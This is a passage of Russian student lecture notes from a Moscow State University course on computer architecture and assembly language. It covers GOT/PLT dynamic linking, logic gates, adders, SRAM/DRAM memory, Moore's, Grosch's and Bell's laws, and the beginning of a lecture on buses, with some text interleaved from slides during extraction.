                    81            C3   02   00     00       00

                          Рис. 19.2: Фрагмент памяти для расчёта расстояния до GOT.

    Вообще адрес GOT(ebx) не обязательно указывает на конкретно начало таблицы GOT
в памяти.
    Таким образом, в итоге получается, что:

   • Компоновщик, строя код динамической библиотеки, создаст таблицу смещений
     (GOT)

   • Затем все ссылки в коде обновятся

   • Создастся дополнительная служебная секция .dynsym, в которой компоновщик
     распишет все те символы, которые должны использоваться в динамической
     компоновке. То есть, symtable появляется такая таблица.

   • Создаётся отдельная секция для перебазирования ссылок (.rel.dyn), чтобы
     динамический компоновщик потом знал, где и какие ссылки перебазировать
     (ссылки, размещённые в GOT).

   В тот момент, когда динамическая библиотека будет загружена в память, её секция
GOT динамическим компоновщиком будет определённым образом пересчитана.
   Можно убедиться, что в динамической библиотеке есть два загружаемых сегмента.
Первый идёт прямо от начала файла, он должен быть помещён на какой-то виртуальный
адрес. набор секций, покрывающих первый сегмент, будет скопирован и помещён в
диапазон адресов, который традиционно называется страницей. Эта страница содержит
атрибуты, позволяющие её читать и выполнять, но не перезаписывать.



                                                          203
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                               Позиционно независимый код в IA-32
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович
          • Абсолютные   адреса неизвестны, но известны смещения.
                                                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU
                         –
                         Можно обращаться к функциям своего модуля.
                         –
                         В IA-32 нет возможности обратиться к данным по смещению относительного текущего
   Второй             загружаемый        сегмент
                         значения счетчика           начинается
                                           команд. Такая             немного
                                                         возможность появится      левее позиции, на
                                                                                    которую
                                                                              в x86_64.
         •  Код
ссылается GOT   и данные размещаются   в памяти друг  за другом, в сегмент данных
                   (вся схема на рисунке 19.3). Таким образом будут захвачены
            входит служебная таблица – Global Offset Table (GOT).
дополнительные    две страницы
         • GOT содержит   указателипо  4 килобайта,
                                    (абсолютные  адреса) обе  страницы
                                                           на внешние     получают
                                                                       функции и   атрибуты,
открывающие переменные.  Их адреса становятся известны   не ранее этапа
               чтение, запись, но не доступны для выполнения. Это делается таким
            динамической компоновки при запуске программы.
образом, так как содержимое
         • Динамический       GOT необходимо
                          компоновщик    заполняетпереписать.
                                                   GOT необходимыми значениями.




            Рис. 19.3: Схема двух загружаемых сегмента динамической библиотеки.



Код при вызове функций
   В данном случае появляется возможность для оптимизации. При обращении к
данным определить, что читается какая-то память или в неё что-то записывается конечно
можно, но привязать к каждому такому действию какое-то пользовательское действие не
представляется возможным.
   При вызове же функций происходит передача управления. К передаче управления
можно привязывать дополнительные действия. Это позволяет отложить пересчёт
значений GOT до самого последнего момента, до того, как та или иная функция из
других модулей будет вызываться. Это делается для того, чтобы загрузка динамических
библиотек в память шла гораздо быстрее. Механизм, выполняющий всё это называется
ленивое связывание.
   Плата за такое ускорение состоит в том, что в код придётся добавить много
вспомогательных функций-заглушек, которые будут отрабатывать все вышеописанные
действия. Тогда ленивое связывание (lazy binding) вместо вызова реальной функции
будет обращаться к этой заглушке. Функция заглушки будет знать адрес реальной
функции. После определения адреса она сможет переписать ячейку GOT уже нужным
значением. Далее все следующие вызовы будут уже перекидывать не на заглушку,
а на реальный адрес функции, который появляется в GOT. В заглушке разместятся
также дополнительные секции, которые называются .plt (procedure klinking table). Таким
образом, появляется ещё одна служебная таблица связывания процедур.
   Теперь можем рассмотреть вызов функции printf, которая относится к стандартной
библиотеке. Пересчёт ссылки во время компоновки построения динамической
библиотеки происходит похожим образом.



                                                           204
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




    Для начала определим контекст, в котором происходит работа. Считается, что в
адресном пространстве программы (уже пользовательской) размещён динамический
компоновщик и ждёт нужного момента времени, чтобы связать с искомой функцией
(printf в данном случае). Для того, чтобы динамический компоновщик отработал, ему
требуется дополнительная информация о том, где что находится (в частности описания
символов в секции dynamic). Кроме того, необходимо некоторое дополнительное
описание (libhello.so), которое компоновщик подготавливает самостоятельно. Вся эта
информация доступна по предопределённым элементам в глобальной таблице смещений
(по нулевому смещению находится адрес секции dynamic, по +4 находится описание
модуля libhello, а по смещению +8 располагается функция самого динамического
компоновщика, реализующая линейное связывание). В момент, когда из кода исполнение
“вытягивается” на заглушку, происходит jmp по абсолютному адресу, который размещён
в памяти на месте ebx+12. Далее происходит процедура ленивого связывания. После
того, как процедура отработала, она определит адрес printf, который будет обнаружен в
libc.
    В подготовленной программе, которая была подготовлена с использованием
динамической компоновки, появляется дополнительный заголовок INTERP. То есть,
появляется интерпретатор, который будет отрабатывать после момента начала загрузки
до момента передачи управления на входную точку модуля. Программа интерпретатор в
рассмотренном случае - это ld-linux.so. В начале динамический компоновщик обязательно
должен быть загружен, так как он отрабатывает в начале.


Загрузка динамически скомпонованного исполняемого файла
   Для реальных программ, которые выполняются в актуальных версиях любой unix
системы, всё выглядит следующим образом.
   • Для начала, чтобы собранная программа отработала, необходимо указать
     директории, где находятся используемые динамические библиотеки. Сделать
     это можно с помощью системной переменной 𝐿𝐷_𝐿𝐼 𝐵𝑅 𝐴𝑅𝑌 _𝑃𝐴𝑇 𝐻. Утилита
     ldd расписывает зависимости между динамическими библиотеками с файлами,
     которые будут использоваться при запуске. Пример использования утилиты ldd:
      student@pc :~/ asm / linking$ LD_LIBRARY =`pwd ` ldd hello - dlib
              linux - gate .so .1 (0 xf7fd5000 )
              libhello .so => / home / student / asm / linking / libhello .so
              (0 xf7fca000 )
              libc .so .6 => / lib32 / libc .so .6 (0 xf7ddd000 )
              / lib /ld - linux .so .2 (0 xf7fd6000 )

     Утилита показывает, что для работы файла hello-dlib необходимо загрузить четыре
     модуля в память.


                                        205
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Бесконечный цикла поиска зависимости отсутствует, так как сам компоновщик
     компонуется полностью статически. Таким образом, после загрузки содержимого
     исполняемого файла, достаточно догрузить файл с загрузчиком ld-linux.so.

   • Далее уже загрузчик способен отслеживать все необходимые зависимости
     и досылать содержимое динамических библиотек в память. Он это делает,
     просматривая содержимое секции .dynamic, где описаны зависимости.

   • Далее содержимое GOT переписывается, опираясь на служебные таблицы
     (обновляются те указатели, с помощью которых будет происходить обращение к
     данным).

   • После того, как динамический компоновщик отрабатывает, он передаёт управление
     на точку входа самой программы. Переменная 𝐿𝐷_𝐿𝐼 𝐵𝑅 𝐴𝑅𝑌 _𝑃 𝐴𝑇 𝐻 ещё раз
     доопределяется.




                                       206
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 20. Аппаратное обеспечение
Логические вентили
   В какой-то момент появилась технологическая возможность воплотить элементы
счётной машины в жизнь. Идея появилась раньше, чем техническая возможность.
Первые механические вычислительные машины вызывали вопросы надёжности,
масштабирования и скорости работы. Переломным моментом стало изобретение
полупроводников в первой половине 20-го века. Появились различные транзисторы,
являющиеся основой для вычислительной техники в наше время. Простое устройство,
которое по сути размыкает цепь позволяет быстро производить инвертирование сигнала.
   Рассмотрим зависимость напряжения некоторого сигнала, который идёт по линии,
от времени. Есть некоторые пороговые значения напряжений, при переходе которых
транзистор ведёт себя совершенно другим образом. Если подавать напряжение на затвор
транзистора, то в какой-то момент он начинает себя вести как проводник. С одной стороны
подаётся питающее напряжение, с другой стороны земля, тогда выходной сигнал 𝑉𝑜𝑢𝑡
резко спадает из-за эффекта проводимости (стекает на землю). Если в другую сторону
снижается входное напряжение (𝑉𝑖𝑛 ), то происходит размыкание проводника и выходное
напряжение увеличивается. Зависимость представлена графически на рисунке 20.1.
                                          v
                                  Vout




                                    Vin                                  t
Рис. 20.1: Зависимость напряжения некоторого сигнала, который идёт по линии, от
времени.

   Если посмотреть на схему с биполярным транзистором, то подача напряжения на базу
приведёт к тому, что коллектор и эмиттер будут замыкаться. Таким образом проведена
инверсия сигнала. Такая конструкция работает очень быстро, переключение состояний
происходит за наносекунды или даже меньше (зависит от вещества транзистора).
Сегодняшние технологии позволяют размещать транзисторы очень компактно. В
современной электроники используются полевые транзисторы, а не биполярные.
Последовательные и параллельные соединения транзисторов позволяют строить
функции булевой алгебры.


                                              207
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




    Рассмотрим подробно параллельно подключённые транзисторы. Питающее
напряжение будет питать один или другой сток. Схема двух параллельных транзисторов
на рисунке 20.2.




                                  Рис. 20.2: Схема двух параллельных транзисторов.

   Случаи, когда питающее напряжение открывает один или другой сток (1 означает, что
ток подан, 0 - что не подан). Таким образом, получили логический элемент NOR (НЕ-
ИЛИ).

                                                   𝑉𝑜𝑢𝑡    𝑉1   𝑉2
                                                    1      0    0
                                                    0      0    1
                                                    0      1    0
                                                    0      1    1

   Аналогичным образом можно рассмотреть последовательное соединение
транзисторов. Это логический элемент NAND (НЕ-И). Схема подключения приведена на
рисунке 20.3.
   Можно составить аналогичную табличку.

                                                   𝑉𝑜𝑢𝑡    𝑉1   𝑉2
                                                    1      0    0
                                                    1      0    1
                                                    1      1    0
                                                    0      1    1

   Каждый из рассмотренных случаев - это схема с одним выходом и двумя входами.
Можно совмещать модули и получать более сложные функции. Например, подключив
выход NAND к инвертору получается обычный AND. Аналогично могут быть получены
другие более сложные схемы. Например, можно реализовать сравнение одиночных битов.
Можно также сравнивать целые слова с помощью каскадного AND.



                                                          208
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                                           Логические вентили
Архитектура ЭВМ и язык ассемблера                                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  Рис. 20.3: Схема двух последовательных транзисторов.

                                                                     © 2021 МГУ/ВМК/СП

Сумматор. Полусумматор
                   Полусумматор
  Чуть более сложная операция - это сложение. Эта операция имеет два выхода, так как
необходимо учесть бит переноса. Схема представлена на рисунке 20.4. Бит переноса - это
C,•результат
     Суммирует  биты
             - бит S. A и B
  • Результат – бит S
  • Перенос – бит C




                                            Рис. 20.4: Схема полусумматора.
                                                                             5
   Сумматор (полусумматор) можно усложнить, учитывая бит, который может
заноситься из ранее суммировавшихся разрядов. Схема представлена на рисунке 20.5.
   С помощью нескольких сумматоров можно суммировать слова.


Мультиплексор
    Каждая рассмотренная цепь выполняет фиксированную операцию над входными
сигналами. Можно построить мультиплексор, который будет выбирать в зависимости от
селектора значение либо по линии A, либо по линии B. Простейшая схема мультиплексора
с одним управляющим битом S представлена на рисунке 20.6.




                                                          209
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                                                                                                         © 2021 МГУ/ВМК/СП




Архитектура ЭВМ и язык ассемблера               Полный двоичный сумматор
                                                                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                                                  Мультиплексор


                                  Рис. 20.5: Схема полного двоичного сумматора.



                                                                                                                   6




    Рис. 20.6: Схема простейшего мультиплексора с одним управляющим битом S.


Арифметико-логическое устройство
   Арифметико-логическое устройство может выглядеть с функциональной точки зрения
как устройство с мультиплексором, которое выполняет то или иное конкретное действие.
То есть, есть возможность, что за операция будет проводиться, а общий вид входных и
выходных данных у них у всех одинаковый.


Регистр: сохранение 1 бита
    Ранее рассмотренные схемы не имели возможность запомнить в себе то или иное
состояние. Самое простое - сохранение одного бита.
    В процессоре есть часы. Под часами подразумевается генератор сигналов
определённого вида. Традиционно стробирующий сигнал (периодичные квадратные
зубцы). Если на каком-то такте произошла запись значения, то на последующий тактах
это значение должно выдаваться из ячейки памяти. Необходимо реализовать эту ячейку.




                                                      210
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Статическая память
   Отличительная черта цепей, реализующих статическую память состоит в том, что
выходы схем соединены на входы. Это образует реактивный эффект, который будет
проявляться в том, что, имея два разных входа (пусть S и R), которые имеют выходы,
соединённые на входы друг друга (то есть, выход R соединён со входом S и наоборот),
выходы будут противоположными (например Q и 𝑄).   ¯
   За счёт чего это происходит? Каждый элемент (в каждой ветке от входа
соответственно) реализует функцию отрицания NOR. Тогда можно составить таблицу
значений. Получится, что, если оба входа - нули, то на двух выходах могут находиться
только противоположные значения, причём возможны два случая (0 и 1 или 1 и 0). Если
подать на какой-то из входов сигнал (только на один), то ситуация будет однозначна.
                                     Q   S     R
                                     ?   0     0
                                     1   1     0
                                     0   0     1
                                     ?   1     1
   Такая схема может запомнить, что было отправлено в неё на другом такте. Такая
схема называется защёлкой. Если стоят обе единички, то состояние неоднозначно
тоже. Добавив перед каждым входом модуль AND, можно добиться дискретности
возникновения событий. Кроме того, можно один сигнал запускать по двум линиям.
Итого - необходимо 6 транзисторов для одной такой ячейки памяти.


Отличие статической памяти от динамической памяти
    В динамической памяти принципиально другая элементная база. В ней один
транзистор, чтобы создавать отсечки. Кроме того, в данной схеме присутствует
конденсатор. Если в конденсаторе есть заряд, то можно считать, что в ячейке хранится
1, если нет, то 0. Типичный срок жизни заряда, который хранится в конденсаторе на
процессоре составляет порядка 100 мс. Таким образом, время от времени требуются
цикли регенерации (чтение ячейки в качестве регенерации).


Разработка интегральных схем
   Комбинируя модули можно построить системы любого уровня сложности, но это
может занимать очень много времени. Для ускорения разработки электрических цепей
применяются языки описания аппаратуры (например VHDL - язык “на основе” ADA
или Verilog - язык “на основе” Си). Языки позволяют описать те или иные действия
с поступающими на вход модуля данными. Данные поступают таким же образом - это
электрические сигналы.


                                         211
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Этапы разработки и изготовления компонент ЭВМ
   Всё начинается во внутреннем центре дизайна. Туда “затаскиваются” некоторые
сторонние компоненты (как библиотеки высокого уровня). Эти библиотеки компонуются
с описанием, которое подготавливается собственными разработчиками. Командная
интеграция сводит всё воедино и получают большую программу в текстовом виде
например на Verilog. Эта программа по сути является описанием устройства аппаратуры.
Далее эта программа передаётся специальному компилятору, который текстовую
запись преобразует в схему уровня регистровых передач. Получается схема из
элементарных компонент. Далее схема должна превратиться в картинку, которая
является последовательностью слоёв, укладываемых на изолятор. ©Каждый  2021 МГУ/ВМК/СП слой


будет комбинировать в себе материалы с разной проводимостью. Для создания такой
         Этапы разработки и изготовления компонент
интегральной схемы на подложке используются фотошаблоны. С помощью травления
                                       ЭВМ схемы, которые собираются в большие
по шаблону получаются готовые интегральные
платы и работающие устройства. Схема этапов разработки представлена на рисунке 20.7.




                Рис. 20.7: Схема этапов разработки и изготовления компонент ЭВМ.



                                                                                        14
Закон Мура
   Характер роста развития микроэлектроники экспоненциальный. Замечен был ещё
в 60-х годах инженером Гордоном Муром. Это эмпирический закон, который всё ещё
выполняется. Изначально закон звучал так, что число транзисторов на кристалле каждые
два года будет удваиваться. Со временем экспонента немного сгладилась и период
удвоения количества транзисторов возрос до трёх лет. В какой-то момент нельзя будет
дальше уменьшать транзисторов из-за физических фундаментальных ограничений.
Также, нельзя сильно увеличивать площадь кристалла, так как время, за которое сигнал
будет проходить от края до края кристалла тогда увеличится (быстрее нельзя из-за того,
что сигналы распространяются со скоростью света). Техника стремительно устаревает,
поэтому простаивание процессоров - это потеря времени.




                                              212
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Закон Гроша
   Примерно в то же время, в которое был сформулирован закон Мура, был
сформулирован закон Гроша инженером из компании IBM. Звучал он так:
производительность компьютеров будет увеличиваться пропорционально квадрату
денежных вложений в его конструирование. В течение 10-15 лет этот закон выполнялся.
В то время компьютеры были огромного размера. Как следствие, была выдвинута
гипотеза, что достаточно около 5 компьютеров для удовлетворения потребностей всего
человечества, а деньги для их создания будут потрачены максимально эффективно.
Однако, стало понятно, что бесконечно увеличивать производительность за счёт денег
невозможно. К 1997 году закон был полностью опровергнут, тем самым была показана
ограниченная применимость к широкому классу компьютеров. Интересно, что закон
пережил реинкарнацию в некотором роде. На рынке поисковых систем он имеет место
быть, так как по сути люди вложили очень много средств, и теперь небольшое количество
поисковых систем покрывает нужды человечества.


Закон Белла
    Закон был сформулирован знаменитым инженером Гордоном Беллом в 1972 году
и отсылает к понятию класса компьютеров. Закон звучит так: примерно каждое
десятилетие появляется новый, более дешёвый класс компьютеров, который использует
новую программную, аппаратную платформу. В результате появляются новые отрасли
индустрии и области применения компьютеров. Этот закон выполняется до сих пор.
Например, 2010-е годы стали эпохой интернета вещей. Нулевые годы были эпохой
появления смартфонов, которых ранее не существовало. В 90-е годы появились ноутбуки,
а в 80-е персональные компьютеры.


Различные классы компьютеров
   Каждый класс компьютеров определяется определёнными характеристиками.
Эти характеристики связаны с техническими особенностями, что влияет на цену всей
системы. Процессоры бывают разные по сложности, по мощности. Ничего удивительного
в сильном различии стоимости нет, так как для каждого класса компьютеров
формулируются свои требования, в зависимости от того, где он применяются. Например
для мобильных устройств отличительная особенность - это требование к быстроте
реакции (процессор может быть очень мощность, но из-за каких-то технологических
особенностей может быть задержка отклика на действия пользователя). Для сервера
же задержка в несколько секунд будет совсем не критична, для него важнее суммарная
пропускная способность (суммарное количество платежей за сутки например).
   Тем проще устройство, тем большее количество нужно их выпустить. По мировым



                                        213
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                     ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




продажам доминируют не процессоры с архитектурой x86, а с архитектурами
встраиваемых устройств (ARM, ARC, MIPS). Точные чсила привести сложно из-за
коммерческой тайны, но характер таков, что число процессоров для настольных
компьютеров на порядки меньше, чем число процессоров для различных встраиваемых
небольших устройств.


Оперативная память
   В не зависимости от класса, все компьютеры имеют оперативную память. Основные
характеристики устройства памяти разделяют её на статическую и динамическую (SRAM
и DRAM соответственно).
   Статическая память обладает следующими свойствами:

   • В данном типе памяти ячейки реализуются с помощью транзисторов.

   • При наличии питания информация, сохранённая в ячейке может оставаться там
     неограниченно долго.

   • Относительно устойчива к радиации и воздействию электромагнитных полей.

   • Быстрее и дороже DRAM.

   Динамическая (DRAM) характеризуется следующим:

   • Состоит из конденсатора и транзистора

   • Сохраняемое значение необходимо обновлять каждые 10-100 мс.

   • Более чувствительна к внешнему воздействию.

   • Медленнее и дешевле SRAM.

   Основные характеристик представлены в таблице:

   Тип                  Транз.     Относ.    Устойчивая   Контроль   Относ.           Применение
   памяти               на 1 бит   время                             стоимость
                                   доступа
   SRAM                 4 или 6    1×        да           нет        100 ×            Кэш
   SRAM                 1          10 ×      нет          да         1×               Основная
                                                                                      оперативная
                                                                                      память

   Если свести ключевые характеристики вместе, то получается картинка исключённого
третьего. При формировании памяти можно выбрать лишь две положительные



                                                    214
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                 КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




характеристики. Они будут достигаться засчёт того, что всё плохо будет с третьей.
Характеристики: скорость работы, цена, объём памяти.
   Динамическая память имеет определённую организацию. Неэффективно обращаться
к отдельному биту, поэтому они группируются в более крупные компоненты -
                                                                      © 2021 МГУ/ВМК/СП
суперячейки. Таким образом, оперативная память - это комплект суперячеек размером
сколько-то бит (то есть, каждая суперячейка может быть 8, 16 или другое количество бит).
                     Типовая организация DRAM
Каждая суперячейка рассматривается, как элемент двумерной матрицы, так как пары
транзистор-конденсатор размещаются на подложке. Схематичное строение оперативной
памяти, как комплекта суперячеек представлено на рисунке 20.8.

                                                         16 x 8 DRAM
                                                                                Столбцы
                                                                       0    1       2      3
                                                2 бита          0
                                                /
                                                адрес
                                                                1
                                                          Строки
                                  Контроллер
                                                                2                                   суперячейка
                  запросы           памяти
                                                                                                        (2,1)
                   от CPU                                       3
                                                8 бит
                                                /
                                               данные


                                                                           Буфер строки


        Рис. 20.8: Схема оперативной памяти как двумерного массива суперячеек.

   Чтобы считать суперячейку из динамической памяти, необходимо выполнить
несколько шагов:
  1. Необходимо указать в какой строке матрицы находится интересующая ячейка. Тогда
     из контроллера памяти по шине приходит строб адреса строки (одно число, которое
     приходит от процессора за один такт).

  2. Содержимое строки отправляется в буфер, где запоминается.

  3. Аналогично строке указывается строб адреса столбца.

  4. Выбранная суперячейка отправляется из буфера в процессор через контроллер
     памяти.
    Типовой приём ускорения работы с памятью - расслоение. Пусть модуль памяти
состоит из 8 отдельных микросхем. Раскидываются элементы большого машинного слова
таким образом, чтобы каждая часть оказывалась в своём банке памяти (на отдельной
микросхеме). Тогда за одну операцию можно считать не одну часть, а все 8 (ускорение
в 8 раз).


                                                             215
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Развитие DRAM

    Организация ячейки принципиально не менялась уже около 50 лет. В какой-то момент
было замечено, что можно повторно использовать адрес строки (то есть, если строку
скопировали в буфер, можно выдать последовательность из одного адреса строки и потом
из нескольких адресов столбцов, которые идут подряд).
    Кроме того, стали производить синхронную память DRAM с удвоенной частотой (так
как активация может происходить как на спаде электрического сигнала, так и на подъёме),
эта технология называется DDR.

Энергонезависимая память

   Энергонезависимая память не теряет информацию при отключении электропитания.
Такая память например используется при запуске BIOS. Существует целый набор
способов, как построить такой тип памяти.

   • Самый простой способ - взять матрицу из полупроводников и пережечь её на
     производстве. Однако изменить состояние такой матрицы никак нельзя.

   • Первая перезаписываемая память могла стереть информацию посредством
     ультрафиолета.

   • Затем придумали электрическую перезаписываемую память (EEPROM). Для
     стирания информации используется повышенное напряжение. Развитие эта
     технология получила во флеш-памяти. Технология работы основана на квантовом
     эффекте туннелирования.




                                         216
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                            КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                 ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                  СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 21. Организация шин
Шины и адресные пространства.
   В этой лекции будут рассмотрены вопросы, связанные саппаратной составляющей.
Будут рассмотрены разные аспекты устройства шин и решения прикладных задач с точки
зрения разработчика и пользователя.
   Система шин – дорожная сеть, связывающая центральный процессор (ЦП),
оперативную память, устройства вывода. Через шины данные, которые компьютер
получает извне, передаются ЦП и оперативной памяти.                 © 2021 МГУ/ВМК/СП




                                                                                             2
                                  Рис. 21.1: Схема связи устройств

   Важнейшая характеристика шин:

   • пропускная способность – то, какой объем информации может быть передан через
     шину за единицу времени. Должны быть хорошо сбалансированы связи между
     шинами, чтобы не получить ”пробки”.

Выделяют следующие типы шин:

   • Системная шина связывает процессор с тем, что находится вне его.

   • Шина памяти связывает оперативную память с остальными компонентами.




                                                217
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Шина ввода/вывода разбивается на много шин, связанных между собой. Она
     связывает устройства долговременного хранения информации, устройства
     взаимодействия с пользователем и устройства вывода( например, графический
     адаптер).

   Шины работают на более низких частотах чем ЦП, поэтому необходим тактовый
генератор(см. рис. 21.1), частоты с которого через множитель попадают на процессор.
Этот сигнал будет каждый раз запускать очередную порцию обработки информации
внутри процессора. На те устройства комнтроллера шин, которые обеспечивают связь
устройства с внешним миров, частота может подаваться без умножений, поэтому на
                                                                     © 2021 МГУ/ВМК/СП
каждую группу выполненных в процессоре команд, приходится одна операция на шине.

   ШинаТиповое   соединение
